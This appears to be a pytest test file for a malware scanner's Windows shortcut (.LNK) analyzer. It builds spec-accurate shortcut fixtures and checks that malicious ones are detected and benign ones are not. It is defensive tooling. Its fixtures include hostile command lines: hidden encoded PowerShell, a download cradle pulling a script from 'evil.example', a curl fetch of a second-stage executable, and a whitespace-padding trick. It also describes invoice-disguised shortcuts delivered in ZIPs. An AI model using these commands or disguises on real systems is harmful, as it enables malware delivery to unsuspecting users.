"""
Windows shortcut (.LNK) analysis.

A .lnk is not a document, it is a stored command line. That is what makes it a
delivery and persistence artifact: it arrives looking like an invoice and runs
whatever the shortcut says. It is a primary ClickFix persistence mechanism and a
standard payload inside ISO and ZIP deliveries.

Before this, a .lnk reached Malscan and nothing looked at it — entropy and
string scanning over raw bytes, which is close to useless when the interesting
part is short and UTF-16.

The shortcuts here are built byte by byte to the MS-SHLLINK layout rather than
mocked, because a parser that has never met the real structure is worth nothing.
"""

import struct

import pytest

from analysis_engine.lnk_analyzer import analyze_lnk, is_lnk
from analysis_engine.static_analyzer import detect_file_type

CLSID = b"\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"

HAS_NAME = 0x04
HAS_RELATIVE_PATH = 0x08
HAS_WORKING_DIR = 0x10
HAS_ARGUMENTS = 0x20
HAS_ICON_LOCATION = 0x40
IS_UNICODE = 0x80


def build_lnk(*, arguments="", relative_path="", working_dir="", icon="",
              name="", show_command=1, unicode_strings=True,
              with_idlist=False, with_link_info=False):
    """A minimal but structurally valid Shell Link."""
    flags = IS_UNICODE if unicode_strings else 0
    strings = []

    def add(bit, text):
        nonlocal flags
        if text:
            flags |= bit
            strings.append((bit, text))

    add(HAS_NAME, name)
    add(HAS_RELATIVE_PATH, relative_path)
    add(HAS_WORKING_DIR, working_dir)
    add(HAS_ARGUMENTS, arguments)
    add(HAS_ICON_LOCATION, icon)

    if with_idlist:
        flags |= 0x01
    if with_link_info:
        flags |= 0x02

    header = struct.pack(
        "<I16sIIQQQIIIHHII",
        0x4C, CLSID, flags,
        0,                      # FileAttributes
        0, 0, 0,                # Creation / Access / Write times
        0,                      # FileSize
        0,                      # IconIndex
        show_command,
        0, 0, 0, 0,             # HotKey, Reserved x3
    )
    assert len(header) == 76, f"header is {len(header)} bytes, spec says 76"

    body = b""
    if with_idlist:
        # An ID list we do not parse; its declared size must still be honoured,
        # which is the point of including it.
        idlist = b"\x00" * 30
        body += struct.pack("<H", len(idlist)) + idlist
    if with_link_info:
        # LinkInfo with LocalBasePath, so the target can be recovered.
        path = b"C:\\Windows\\System32\\cmd.exe\x00"
        base_off = 28
        info = struct.pack("<IIIIIII", 0, 28, 0x1, base_off, 0, 0, 0) + path
        info = struct.pack("<I", len(info) + 0) + info[4:]
        info = struct.pack("<I", 28 + len(path)) + info[4:]
        body += info

    # StringData, in the spec's fixed order.
    for _, text in strings:
        encoded = text.encode("utf-16-le" if unicode_strings else "latin-1")
        count = len(text) if unicode_strings else len(encoded)
        body += struct.pack("<H", count) + encoded

    return header + body


# ── The builder must produce something the parser recognises ─────────────────

def test_the_fixture_is_a_valid_shortcut():
    data = build_lnk(arguments="hello")
    assert is_lnk(data), "the test fixture is not a valid LNK — every case below is vacuous"


def test_magic_detection_identifies_shortcuts(tmp_path):
    path = tmp_path / "invoice.pdf.lnk"
    path.write_bytes(build_lnk(arguments="x"))
    assert detect_file_type(str(path))["magic_type"] == "Windows Shortcut (LNK)"


def test_ordinary_files_are_not_mistaken_for_shortcuts():
    assert not is_lnk(b"MZ" + b"\x00" * 100)
    assert not is_lnk(b"%PDF-1.7" + b"\x00" * 100)
    # HeaderSize alone is just the integer 76 and must not be enough on its own.
    assert not is_lnk(b"\x4C\x00\x00\x00" + b"\x00" * 100)


# ── Parsing ──────────────────────────────────────────────────────────────────

def test_command_line_arguments_are_recovered():
    data = build_lnk(arguments="-nop -w hidden -enc SQBFAFgA", relative_path="..\\..\\Windows\\System32\\cmd.exe")
    info = analyze_lnk("x.lnk", data=data)

    assert info["is_lnk"] is True
    assert "-enc" in info["arguments"]
    assert "cmd.exe" in info["relative_path"]


def test_all_string_fields_land_in_the_right_slots():
    info = analyze_lnk("x.lnk", data=build_lnk(
        name="Invoice",
        relative_path="..\\payload.exe",
        working_dir="C:\\Temp",
        arguments="/c whoami",
        icon="shell32.dll",
    ))

    assert info["relative_path"] == "..\\payload.exe"
    assert info["working_dir"] == "C:\\Temp"
    assert info["arguments"] == "/c whoami"
    assert info["icon_location"] == "shell32.dll"


def test_optional_structures_are_skipped_by_their_declared_size():
    """If the ID list length is mishandled, every string after it is garbage."""
    info = analyze_lnk("x.lnk", data=build_lnk(
        arguments="-enc AAAA", with_idlist=True,
    ))
    assert info["arguments"] == "-enc AAAA"


def test_ansi_shortcuts_parse_too():
    info = analyze_lnk("x.lnk", data=build_lnk(arguments="/c calc", unicode_strings=False))
    assert info["arguments"] == "/c calc"


# ── Detection ────────────────────────────────────────────────────────────────

def test_encoded_powershell_is_flagged():
    info = analyze_lnk("x.lnk", data=build_lnk(
        relative_path="..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments="-nop -w hidden -enc " + "QQBBAEEAQQBBAEEA" * 6,
    ))
    flags = " ".join(info["suspicious"]).lower()

    assert info["suspicious"], "an encoded PowerShell shortcut produced no findings"
    assert "encoded" in flags
    assert "interpreter" in flags


def test_download_cradle_in_a_shortcut_is_flagged():
    info = analyze_lnk("x.lnk", data=build_lnk(
        relative_path="..\\Windows\\System32\\cmd.exe",
        arguments="/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')",
    ))
    flags = " ".join(info["suspicious"]).lower()

    assert "downloads content" in flags
    assert "invoke-expression" in flags
    assert "url" in flags


def test_padding_whitespace_trick_is_flagged():
    info = analyze_lnk("x.lnk", data=build_lnk(
        relative_path="..\\Windows\\System32\\cmd.exe",
        arguments="/c echo hi" + " " * 60 + "& powershell -enc AAAA",
    ))
    assert any("whitespace" in f.lower() for f in info["suspicious"])


def test_hidden_window_is_flagged():
    info = analyze_lnk("x.lnk", data=build_lnk(
        relative_path="..\\Windows\\System32\\cmd.exe",
        arguments="/c whoami", show_command=7,
    ))
    assert any("without showing a window" in f for f in info["suspicious"])


def test_document_icon_over_an_interpreter_is_flagged():
    info = analyze_lnk("x.lnk", data=build_lnk(
        relative_path="..\\Windows\\System32\\cmd.exe",
        arguments="/c start x", icon="C:\\Windows\\System32\\shell32.dll",
    ))
    assert any("document icon" in f for f in info["suspicious"])


# ── False positives ──────────────────────────────────────────────────────────

def test_an_ordinary_application_shortcut_is_clean():
    """The shortcut Windows itself creates for a normal program."""
    info = analyze_lnk("x.lnk", data=build_lnk(
        name="Notepad",
        relative_path="..\\..\\Windows\\notepad.exe",
        working_dir="C:\\Windows",
        icon="C:\\Windows\\notepad.exe",
    ))
    assert info["is_lnk"] is True
    assert info["suspicious"] == [], f"ordinary shortcut flagged: {info['suspicious']}"


def test_a_document_shortcut_is_clean():
    info = analyze_lnk("x.lnk", data=build_lnk(
        name="Quarterly report",
        relative_path="..\\Documents\\report.docx",
        working_dir="C:\\Users\\me\\Documents",
    ))
    assert info["suspicious"] == []


def test_a_non_shortcut_returns_is_lnk_false():
    info = analyze_lnk("x.bin", data=b"MZ" + b"\x00" * 200)
    assert info["is_lnk"] is False
    assert info["suspicious"] == []


# ── Malformed input must not raise ───────────────────────────────────────────

@pytest.mark.parametrize("data,label", [
    (b"", "empty"),
    (b"\x4C\x00\x00\x00" + CLSID, "header truncated mid-way"),
    (b"\x4C\x00\x00\x00" + CLSID + b"\xFF" * 56, "flags claim everything, no body"),
], ids=["empty", "truncated", "lying-flags"])
def test_malformed_shortcuts_are_survivable(data, label):
    info = analyze_lnk("x.lnk", data=data)
    assert isinstance(info, dict), label


# ── End to end: the finding has to reach a verdict ───────────────────────────

MALICIOUS_LNK = None  # built lazily below, so the module imports without a client


def _malicious_lnk():
    return build_lnk(
        name="Invoice",
        relative_path="..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments=("-nop -w hidden -enc " + "QQBBAEEAQQBBAEEA" * 8),
        icon="C:\\Windows\\System32\\shell32.dll",
    )


def _scan(client, payload: bytes, filename: str) -> dict:
    import io

    res = client.post("/upload",
                      files={"file": (filename, io.BytesIO(payload), "application/octet-stream")})
    assert res.status_code == 200, res.text
    status = client.get(f"/status/{res.json()['job_id']}").json()
    assert status["status"] == "Completed"
    return status["results"]


def _lnk_points(results: dict) -> int:
    for entry in results.get("score_breakdown") or []:
        if entry["label"] == "Shortcut Command Line":
            return entry["points"]
    return 0


def test_a_malicious_shortcut_scores(client):
    results = _scan(client, _malicious_lnk(), "invoice.pdf.lnk")

    assert _lnk_points(results) > 0, "a shortcut running encoded PowerShell scored nothing"
    assert results["verdict"] in ("Suspicious", "Malicious")


def test_a_shortcut_inside_a_zip_is_still_analysed(client):
    """The ordinary way a malicious .lnk travels — the container is what strips
    the mark-of-the-web warning."""
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("Invoice.pdf.lnk", _malicious_lnk())
    results = _scan(client, buf.getvalue(), "delivery.zip")

    assert _lnk_points(results) > 0, "a shortcut inside a ZIP lost its analysis"


def test_an_ordinary_shortcut_does_not_score(client):
    results = _scan(client, build_lnk(
        name="Notepad", relative_path="..\\..\\Windows\\notepad.exe",
        working_dir="C:\\Windows",
    ), "Notepad.lnk")

    assert _lnk_points(results) == 0


def test_the_command_line_url_becomes_an_indicator(client):
    results = _scan(client, build_lnk(
        relative_path="..\\Windows\\System32\\cmd.exe",
        arguments="/c curl http://lnk-payload-probe.example/stage2.exe -o %TEMP%\\a.exe",
    ), "doc.lnk")

    urls = " ".join((results.get("indicators") or {}).get("urls") or [])
    assert "lnk-payload-probe.example" in urls, (
        "the second-stage URL in the command line was not extracted as an indicator"
    )


def test_a_lying_string_length_cannot_read_past_the_buffer():
    """The character count is attacker-controlled; a huge one must not raise."""
    header = struct.pack(
        "<I16sIIQQQIIIHHII",
        0x4C, CLSID, IS_UNICODE | HAS_ARGUMENTS, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,
    )
    data = header + struct.pack("<H", 0xFFFF) + b"AB"
    info = analyze_lnk("x.lnk", data=data)
    assert info["is_lnk"] is True
    assert info["arguments"] == ""
